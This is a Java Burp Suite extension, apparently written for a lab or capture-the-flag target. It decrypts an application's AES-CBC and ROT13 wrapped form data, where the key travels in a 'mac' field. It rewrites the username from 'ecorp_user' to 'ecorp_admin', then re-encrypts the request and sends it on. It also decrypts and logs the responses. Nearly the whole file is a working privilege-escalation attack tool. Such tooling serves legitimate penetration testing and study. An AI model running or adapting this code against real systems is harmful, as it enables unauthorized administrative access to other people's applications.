import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.*;
import burp.api.montoya.logging.Logging;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.proxy.http.*;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.scope.Scope;
import burp.api.montoya.utilities.Base64Utils;
import burp.api.montoya.utilities.URLUtils;
import burp.api.montoya.utilities.Utilities;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements BurpExtension, HttpHandler {

    private MontoyaApi api;
    private static final String FIXED_IV = "0000000000000000"; // 16-byte IV
    private static final int AES_KEY_LENGTH_BYTES = 16;
    private Logging logging;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
        api.extension().setName("Burp Decryptor");

        // Register the HTTP request handler
        api.http().registerHttpHandler(this);
        logging.logToOutput("Extension Loaded Successfully");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        String requestBody = requestToBeSent.body().toString();

        // Mode 1: Request already has encrypted transport fields (mac/data)
        String encodedMac = extractFormParameter(requestBody, "mac");
        String encodedData = extractFormParameter(requestBody, "data");
        if (encodedMac != null && encodedData != null) {
            try {
                byte[] aesKey = decodeBase64UrlParam(encodedMac);
                byte[] encryptedData = decodeBase64UrlParam(encodedData);

                // Decrypt AES-CBC encrypted data
                byte[] decryptedBytes = decryptAES(encryptedData, aesKey);
                String decryptedData = new String(decryptedBytes, StandardCharsets.UTF_8).trim();

                // Apply ROT13 decoding
                String firstPassRot13 = rot13(decryptedData);
                String finalDecryptedData = doubleDecodeParameterNames(firstPassRot13);

                // Automatically escalate username to ecorp_admin
                String modifiedDecryptedData = rewriteUsernameToAdmin(finalDecryptedData);

                // Re-apply the app's obfuscation order before AES encryption
                String encodedParameterNames = encodeParameterNamesWithRot13(modifiedDecryptedData);
                String reObfuscatedPayload = rot13(encodedParameterNames);

                byte[] reEncryptedBytes = encryptAES(reObfuscatedPayload.getBytes(StandardCharsets.UTF_8), aesKey);
                String updatedDataParameter = encodeBase64UrlParam(reEncryptedBytes);
                String updatedRequestBody = replaceFormParameter(requestBody, "data", updatedDataParameter);

                // Log fully decoded request
                logging.logToOutput("\n===== [Decrypted Request] =====");
                logging.logToOutput(modifiedDecryptedData);
                logging.logToOutput("========================================\n");

                // Send modified request with ecorp_admin
                return RequestToBeSentAction.continueWith(requestToBeSent.withBody(updatedRequestBody));

            } catch (Exception e) {
                logging.logToError("Request decryption failed: " + e.getMessage());
            }
        }

        // Mode 2: Plain username/password request from Burp Repeater (no browser crypto)
        String username = extractFormParameter(requestBody, "username");
        String password = extractFormParameter(requestBody, "password");
        if (username != null && password != null) {
            try {
                String effectiveUsername = rewriteUsernameValue(username);
                String plainPayload = "username=" + effectiveUsername + "&password=" + password;
                String encryptedBody = buildEncryptedBodyFromPlainPayload(plainPayload);

                logging.logToOutput("\n===== [Decrypted Request] =====");
                logging.logToOutput(plainPayload);
                logging.logToOutput("========================================\n");

                return RequestToBeSentAction.continueWith(requestToBeSent.withBody(encryptedBody));
            } catch (Exception e) {
                logging.logToError("Plain request encryption failed: " + e.getMessage());
            }
        }

        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        String responseBody = responseReceived.body().toString();

        // Extract encrypted result parameter from the response body
        String encryptedResult = extractFormParameter(responseBody, "result");
        if (encryptedResult != null) {
            try {
                // Retrieve the AES key from the initiating request (mac=...)
                String requestBody = responseReceived.initiatingRequest().body().toString();
                String encodedMac = extractFormParameter(requestBody, "mac");
                if (encodedMac == null) {
                    logging.logToError("Could not retrieve AES key from request.");
                    return ResponseReceivedAction.continueWith(responseReceived);
                }

                byte[] aesKey = decodeBase64UrlParam(encodedMac);

                // Decode and decrypt response
                byte[] encryptedResponse = decodeBase64UrlParam(encryptedResult);
                byte[] decryptedResponseBytes = decryptAES(encryptedResponse, aesKey);
                String decryptedResponse = new String(decryptedResponseBytes, StandardCharsets.UTF_8).trim();

                // Apply ROT13 decoding
                String finalDecryptedResponse = rot13(decryptedResponse);

                // Log fully decoded response
                logging.logToOutput("\n===== [Decrypted Response] =====");
                logging.logToOutput(finalDecryptedResponse);
                logging.logToOutput("========================================\n");

            } catch (Exception e) {
                logging.logToError("Response decryption failed: " + e.getMessage());
            }
        }

        return ResponseReceivedAction.continueWith(responseReceived);
    }

    private String extractFormParameter(String body, String parameterName) {
        Pattern pattern = Pattern.compile(parameterName + "=([^&]+)");
        Matcher matcher = pattern.matcher(body);
        return matcher.find() ? matcher.group(1) : null;
    }

    private byte[] decodeBase64UrlParam(String value) {
        return Base64.getDecoder().decode(URLDecoder.decode(value, StandardCharsets.UTF_8));
    }

    private byte[] decryptAES(byte[] encryptedData, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");

        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return cipher.doFinal(encryptedData);
    }

    private byte[] encryptAES(byte[] plainData, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");

        cipher.init(Cipher.ENCRYPT_MODE, secretKey, iv);
        return cipher.doFinal(plainData);
    }

    private String rot13(String text) {
        StringBuilder result = new StringBuilder();
        for (char c : text.toCharArray()) {
            if (Character.isLetter(c)) {
                if (Character.isUpperCase(c)) {
                    result.append((char) ('A' + (c - 'A' + 13) % 26));
                } else {
                    result.append((char) ('a' + (c - 'a' + 13) % 26));
                }
            } else {
                result.append(c);
            }
        }
        return result.toString();
    }

    private String doubleDecodeParameterNames(String decodedText) {
        StringBuilder finalDecoded = new StringBuilder();
        String[] params = decodedText.split("&");

        for (String param : params) {
            String[] keyValue = param.split("=", 2);
            if (keyValue.length == 2) {
                String doubleDecodedKey = rot13(keyValue[0]);
                finalDecoded.append(doubleDecodedKey).append("=").append(keyValue[1]).append("&");
            } else {
                finalDecoded.append(param).append("&");
            }
        }

        return finalDecoded.length() > 0 ? finalDecoded.substring(0, finalDecoded.length() - 1) : finalDecoded.toString();
    }

    private String encodeParameterNamesWithRot13(String plainText) {
        StringBuilder encoded = new StringBuilder();
        String[] params = plainText.split("&");

        for (String param : params) {
            String[] keyValue = param.split("=", 2);
            if (keyValue.length == 2) {
                encoded.append(rot13(keyValue[0])).append("=").append(keyValue[1]).append("&");
            } else {
                encoded.append(param).append("&");
            }
        }

        return encoded.length() > 0 ? encoded.substring(0, encoded.length() - 1) : encoded.toString();
    }

    private String encodeBase64UrlParam(byte[] rawBytes) {
        String base64Value = Base64.getEncoder().encodeToString(rawBytes);
        return URLEncoder.encode(base64Value, StandardCharsets.UTF_8);
    }

    private String replaceFormParameter(String body, String parameterName, String newValue) {
        return body.replaceFirst(parameterName + "=[^&]+", parameterName + "=" + newValue);
    }

    private String buildEncryptedBodyFromPlainPayload(String plainPayload) throws Exception {
        byte[] aesKey = new byte[AES_KEY_LENGTH_BYTES];
        new SecureRandom().nextBytes(aesKey);

        String encodedParameterNames = encodeParameterNamesWithRot13(plainPayload);
        String reObfuscatedPayload = rot13(encodedParameterNames);

        byte[] encryptedData = encryptAES(reObfuscatedPayload.getBytes(StandardCharsets.UTF_8), aesKey);

        String encodedMac = encodeBase64UrlParam(aesKey);
        String encodedData = encodeBase64UrlParam(encryptedData);
        return "mac=" + encodedMac + "&data=" + encodedData;
    }

    private String rewriteUsernameValue(String currentUsername) {
        if ("ecorp_user".equals(currentUsername) || "rpbec_hfre".equals(currentUsername)) {
            return "ecorp_admin";
        }
        return currentUsername;
    }

    private String rewriteUsernameToAdmin(String plainPairs) {
        String[] params = plainPairs.split("&");
        StringBuilder rewritten = new StringBuilder();

        for (String param : params) {
            String[] keyValue = param.split("=", 2);
            if (keyValue.length == 2 && "username".equals(keyValue[0])) {
                rewritten.append("username=").append(rewriteUsernameValue(keyValue[1])).append("&");
            } else {
                rewritten.append(param).append("&");
            }
        }

        return rewritten.length() > 0 ? rewritten.substring(0, rewritten.length() - 1) : plainPairs;
    }
}